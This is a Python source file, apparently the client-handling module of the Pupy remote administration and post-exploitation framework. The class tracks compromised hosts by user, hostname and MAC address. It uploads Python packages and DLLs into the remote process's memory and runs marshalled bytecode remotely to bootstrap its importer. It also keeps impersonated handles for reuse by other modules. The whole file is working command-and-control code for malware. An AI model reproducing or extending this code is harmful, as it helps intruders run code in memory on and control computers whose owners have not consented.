# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import zlib

import umsgpack
import sys

from threading import Lock
from os import path

from . import ROOT
from .PupyCompile import pupycompile
from .PupyTriggers import event

from .payloads import dependencies
from .utils.rpyc_utils import obtain
from .utils.arch import make_os_arch, make_proc_arch

from pupy.network.lib.rpc import nowait
from pupy.network.lib.convcompat import (
    as_native_string, as_unicode_string_deep,
    reprb
)

from . import getLogger
logger = getLogger('client')

if sys.version_info.major > 2:
    basestring = str


class PupyClient(object):
    def __init__(self, desc, pupsrv):
        self.desc = as_unicode_string_deep(desc)

        if __debug__:
            logger.debug(
                'New client, desc: %s (%s) -> %s (%s)',
                desc, type(desc), self.desc, type(self.desc)
            )

        # alias
        self.conn = self.desc['conn']

        self.is3to2 = (self.conn.remote_version[0] == 2 and sys.version_info.major == 3)

        self.target = dependencies.Target(
            self.conn.remote_version,
            (
                self.platform, self.arch
            ),
            debug='debug_logfile' in self.desc,
            rustc=self.conn.remote_is_rustc
        )

        self.conn.events_receiver = self._event_receiver

        self.pupsrv = pupsrv
        self.imported_dlls = set()
        self.imported_modules = set()
        self.cached_modules = set()
        self.pupyimporter = None
        self.pupy_load_dll = False
        self.new_dlls = False
        self.new_modules = False
        self.remotes = {}
        self.remotes_lock = Lock()
        self.obtain_call = None

        if self.conn.protocol_version is None:
            # Legacy client
            logger.warning("legacy init")
            self._legacy_init()
        else:
            # Extended init
            self._versioned_init(self.conn.protocol_version)

        # To reuse impersonated handle in other modules
        self.impersonated_dupHandle = None

    def __str__(self):
        return '{PupyClient(id=%s, user=%s, hostname=%s, target=%s)}' % (
            self.desc['id'], self.desc['user'],
            self.desc['hostname'], self.target
        )

    @property
    def id(self):
        return self.desc['id']

    def _event_receiver(self, eventid):
        event(eventid, self, self.pupsrv, **self.desc)

    def get_conf(self):
        return {
            k: v for k, v in self.desc.items() if k in (
                'offline_script', 'launcher', 'launcher_args',
                'cid', 'debug'
            )
        }

    def short_name(self):
        try:
            return '_'.join([
                self.desc['platform'][0:3].lower(),
                self.desc['hostname'],
                self.desc.get(
                    'node', self.desc['macaddr'].replace(':', ''))
            ])

        except Exception:
            return 'unknown'

    def node(self):
        return self.desc['macaddr'].replace(':', '').lower()

    def is_unix(self):
        return not self.is_windows()

    def is_posix(self):
        return self.desc['os_name'].lower() == 'posix'

    def is_linux(self):
        return 'linux' in self.desc['platform'].lower()

    def is_java(self):
        return 'java' in self.desc['platform'].lower()

    def is_android(self):
        return self.desc['platform'].lower() == 'android'

    def is_windows(self):
        if 'windows' in self.desc['platform'].lower():
            return True
        return False

    def is_solaris(self):
        return 'sunos' in self.desc['platform'].lower()

    def is_darwin(self):
        if 'darwin' in self.desc['platform'].lower():
            return True
        return False

    @property
    def platform(self):
        if self.is_android():
            return 'android'
        elif self.is_windows():
            return 'windows'
        elif self.is_linux():
            return 'linux'
        elif self.is_darwin():
            return 'darwin'
        elif self.is_solaris():
            return 'solaris'
        elif self.is_unix():
            return 'unix'

    @property
    def os_arch(self):
        return make_os_arch(
            self.desc['os_arch'].lower()
        )

    @property
    def arch(self):
        return make_proc_arch(
            self.os_arch, self.desc['proc_arch']
        )

    def remote(self, module, function=None, need_obtain=True):
        remote_module = None
        remote_function = None
        need_obtain = need_obtain and self.obtain_call is not False

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if function:
                if function in self.remotes[module]:
                    remote_function = self.remotes[module][function]
                else:
                    remote_function = getattr(
                        self.conn.modules[module], function
                    )
                    self.remotes[module][function] = remote_function

        if function and need_obtain:
            if self.obtain_call:

                def _call_wrapper(*args, **kwargs):
                    return self.obtain_call(remote_function, *args, **kwargs)

                return _call_wrapper

            else:
                def _call_wrapper(*args, **kwargs):
                    return obtain(remote_function(*args, **kwargs))

                return _call_wrapper

        elif function:
            return remote_function

        else:
            return remote_module

    def remote_const(self, module, variable):
        remote_module = None
        remote_variable = None

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if variable in self.remotes[module]:
                remote_variable = self.remotes[module][variable]
            else:
                remote_variable = obtain(
                    getattr(self.conn.modules[module], variable)
                )
                self.remotes[module][variable] = remote_variable

        return remote_variable

    def _versioned_init(self, version):
        self.pupyimporter = self.conn.pupyimporter

        register_package_request_hook = nowait(
            self.conn.pupyimporter_funcs['register_package_request_hook']
        )

        register_package_error_hook = nowait(
            self.conn.pupyimporter_funcs['register_package_error_hook']
        )

        self.conn.register_remote_cleanup(
            self.conn.pupyimporter_funcs['unregister_package_request_hook']
        )

        register_package_request_hook(self.remote_load_package)

        self.conn.register_remote_cleanup(
            self.conn.pupyimporter_funcs['unregister_package_error_hook']
        )

        register_package_error_hook(self.remote_print_error)

        self.pupy_load_dll = self.conn.pupyimporter_funcs['load_dll']
        self.remote_add_package = nowait(
            self.conn.pupyimporter_funcs['pupy_add_package']
        )
        self.remote_invalidate_package = nowait(
            self.conn.pupyimporter_funcs['invalidate_module']
        )

        self.new_dlls = self.conn.pupyimporter_funcs['new_dlls']
        self.new_modules = self.conn.pupyimporter_funcs['new_modules']

        self.obtain_call = lambda func, *args, **kwargs: func(*args, **kwargs)

        self.imported_modules = self.conn.remote_loaded_modules
        self.cached_modules = self.conn.remote_cached_modules

    def _legacy_init(self):
        """ load pupyimporter in case it is not extended version """

        if not self.conn.pupyimporter:
            try:
                self.pupyimporter = self.remote('pupyimporter')
            except Exception:
                self.conn.execute('\n'.join([
                    'import importlib.util, sys, marshal',
                    'mod = importlib.util.module_from_spec(importlib.util.spec_from_loader("pupyimporter", loader=None))',
                    'mod.__file__="<bootloader>/pupyimporter"',
                    'exec(marshal.loads({}), mod.__dict__)'.format(
                        reprb(pupycompile(
                            path.join(
                                ROOT, 'packages', 'all', 'pupyimporter.py'
                            ),
                            'pupyimporter.py',
                            path=True, raw=True,
                            target=self.target.pyver
                        ))
                    ),
                    'sys.modules["pupyimporter"]=mod',
                    'mod.install()']))

                self.pupyimporter = self.remote('pupyimporter')
        else:
            self.pupyimporter = self.conn.pupyimporter

        if self.conn.register_remote_cleanup:
            register_package_request_hook = nowait(
                self.pupyimporter.register_package_request_hook
            )

            register_package_error_hook = nowait(
                self.pupyimporter.register_package_error_hook
            )

            self.conn.register_remote_cleanup(
                self.pupyimporter.unregister_package_request_hook
            )

            register_package_request_hook(
                self.remote_load_package
            )

            self.conn.register_remote_cleanup(
                self.pupyimporter.unregister_package_error_hook
            )

            register_package_error_hook(self.remote_print_error)

        self.pupy_load_dll = getattr(self.pupyimporter, 'load_dll', None)
        self.remote_add_package = nowait(self.pupyimporter.pupy_add_package)
        self.remote_invalidate_package = nowait(
            self.pupyimporter.invalidate_module
        )

        if self.conn.obtain_call:
            def obtain_call(function, *args, **kwargs):
                if args or kwargs:
                    packed_args = umsgpack.dumps((args, kwargs))
                    packed_args = zlib.compress(packed_args)
                else:
                    packed_args = None

                result = self.conn.obtain_call(function, packed_args)
                result = zlib.decompress(result)
                result = umsgpack.loads(result)

                return result

            self.obtain_call = obtain_call

        if self.obtain_call:
            self.imported_modules = set(
                as_native_string(name) for name in self.obtain_call(
                    self.conn.modules.sys.modules.keys
                )
            )
            self.cached_modules = set(
                as_native_string(name) for name in self.obtain_call(
                    self.pupyimporter.modules.keys
                )
            )
        else:
            self.imported_modules = set(
                as_native_string(name) for name in obtain(
                    self.conn.modules.sys.modules.keys()
                )
            )

            self.cached_modules = set(
                as_native_string(name) for name in obtain(
                    self.pupyimporter.modules.keys()
                )
            )

        try:
            self.new_dlls = self.remote('pupyimporter', 'new_dlls')
        except AttributeError:
            self.new_dlls = False

        try:
            self.new_modules = self.remote('pupyimporter', 'new_modules')
        except AttributeError:
            self.new_modules = False

    def load_dll(self, modpath):
        """
        load some dll from memory like sqlite3.dll needed for some .pyd to work
        Don't load pywintypes27.dll and pythoncom27.dll with this. Use
        load_package("pythoncom") instead
        """

        name = path.basename(modpath)
        if name in self.imported_dlls:
            return False

        buf = dependencies.dll(self.target, name)

        if not buf:
            raise ImportError('Shared object {} not found'.format(name))

        if self.pupy_load_dll:
            result = self.pupy_load_dll(name, buf)
        else:
            result = self.conn.modules.pupy.agent.load_dll(name, buf)

        if not result:
            raise ImportError('Couldn\'t load shared object {}'.format(name))
        else:
            self.imported_dlls.add(name)

        return True

    def filter_new_modules(self, modules, dll, force=None, remote=False):
        if force is None:
            modules = set(
                x for x in modules if x not in self.imported_modules
            )

            modules = set(
                module for module in modules if not any(
                    cached_module.startswith(
                        tuple(x.format(module.replace('.', '/')) for x in (
                            '{}.py', '{}/__init__.py', '{}.pyd', '{}.so',
                        ))
                    ) for cached_module in self.cached_modules
                )
            )

        if not modules:
            return []

        if remote:
            return modules

        if dll:
            if self.new_dlls:
                logger.debug('Request new dlls for %s', modules)
                return self.new_dlls(tuple(modules))
            else:
                return tuple(
                    module for module in modules
                    if module not in self.imported_dlls
                )
        else:
            logger.debug('Request new modules for %s', modules)

            if self.new_modules:
                new_modules = self.new_modules(tuple(modules))
            else:
                new_modules = tuple(
                    module for module in modules
                    if not self.pupyimporter.has_module(module)
                )

            for module in modules:
                if module not in new_modules:
                    self.imported_modules.add(module)
                    logger.debug('Add to imported_modules cache: %s', module)

            if force is not None:
                for module in modules:
                    if module not in new_modules:
                        force.add(module)
                        logger.debug('Add to new_modules: %s', module)

                return modules
            else:
                return new_modules

    def invalidate_packages(self, packages):
        if isinstance(packages, basestring):
            packages = [packages]

        invalidated = False

        with self.remotes_lock:
            for module in packages:
                self.pupyimporter.invalidate_module(module)

                for m in list(self.remotes):
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        del self.remotes[m]

                to_remove = set()
                for m in self.imported_modules:
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        to_remove.add(m)

                for m in to_remove:
                    self.imported_modules.remove(m)

                to_remove = set()
                for m in self.cached_modules:
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        to_remove.add(m)

                for m in to_remove:
                    self.cached_modules.remove(m)

        return invalidated

    def load_package(
        self, requirements, force=False, remote=False, new_deps=[],
            honor_ignore=True, target=None):
        try:
            forced = None
            if force:
                forced = set()
            logger.debug("target: %s", self.target)
            logger.debug("requirements: %s", requirements)
            packages, contents, dlls = dependencies.package(
                self.target, requirements,
                remote=remote,
                honor_ignore=honor_ignore,
                filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                    modules, dll, forced, remote
                )
            )

            self.cached_modules.update(contents)

        except dependencies.NotFoundError as e:
            raise ValueError('Module not found: {}'.format(e))

        if remote:
            logger.info(
                'load_package(%s) -> p:%s d:%s',
                requirements,
                len(packages) if packages else None,
                len(dlls) if dlls else None
            )

            return packages, dlls

        if not contents and not dlls:
            return False

        if dlls:
            if self.pupy_load_dll:
                for name, blob in dlls:
                    self.pupy_load_dll(name, blob)
            else:
                for name, blob in dlls:
                    self.conn.modules.pupy.load_dll(name, blob)

            if not contents:
                return True

        if not contents:
            return False

        if forced:
            self.invalidate_packages(forced)

        logger.info('Upload packages bundle, size=%d', len(packages))
        self.remote_add_package(
            packages,
            compressed=True,
            # Use None to prevent import-then-clean-then-search behavior
            name=(
                None if type(requirements) != str else requirements
            )
        )

        new_deps.extend(contents)
        return True

    def unload_package(self, module_name):
        if not module_name.endswith(('.so', '.dll', '.pyd')):
            self.remote_invalidate_module(module_name)

    def remote_load_package(self, module_name):
        module_name = as_native_string(module_name)

        logger.info('remote_load_package for %s started', module_name)

        try:
            return self.load_package(module_name, remote=True)

        except dependencies.NotFoundError:
            logger.info('remote_load_package for %s failed', module_name)
            return None, None

        finally:
            logger.info('remote_load_package for %s completed', module_name)

    def remote_print_error(self, msg):
        self.pupsrv.handler.display_warning(msg)
